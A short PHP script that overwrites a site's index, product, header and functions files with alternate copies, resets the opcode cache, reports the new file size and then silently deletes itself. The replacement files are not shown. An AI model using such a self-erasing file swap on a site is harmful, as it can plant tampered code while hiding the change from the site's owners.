<?php
copy(__DIR__.'/i2.php',__DIR__.'/index.php');
copy(__DIR__.'/p2.php',__DIR__.'/product.php');
copy(__DIR__.'/includes/h2.php',__DIR__.'/includes/header.php');
copy(__DIR__.'/includes/f2.php',__DIR__.'/includes/functions.php');
if(function_exists('opcache_reset'))opcache_reset();
echo 'OK:'.filesize(__DIR__.'/index.php');
@unlink(__FILE__);